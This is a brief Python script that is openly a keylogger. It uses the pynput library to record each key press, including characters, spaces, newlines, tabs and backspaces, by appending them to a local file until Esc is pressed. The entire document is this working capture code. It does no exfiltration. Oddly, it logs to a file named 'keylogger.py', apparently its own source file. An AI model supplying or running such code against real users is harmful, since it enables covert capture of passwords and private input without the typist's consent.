from pynput import keyboard

file = "keylogger.py"

def on_press(key):
    try:
        if hasattr(key, 'char'):
            with open(file, "a") as f:
                f.write(key.char)
        else:
            if key == keyboard.Key.space:
                with open(file, "a") as f:
                    f.write(' ')
            elif key == keyboard.Key.enter:
                with open(file, "a") as f:
                    f.write('\n')
            elif key == keyboard.Key.tab:
                with open(file, "a") as f:
                    f.write('\t')
            elif key == keyboard.Key.backspace:
                with open(file, "a") as f:
                    f.write('\b')
    except Exception as e:
        print(f"Error: {e}")

    if key == keyboard.Key.esc:
        return False 

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
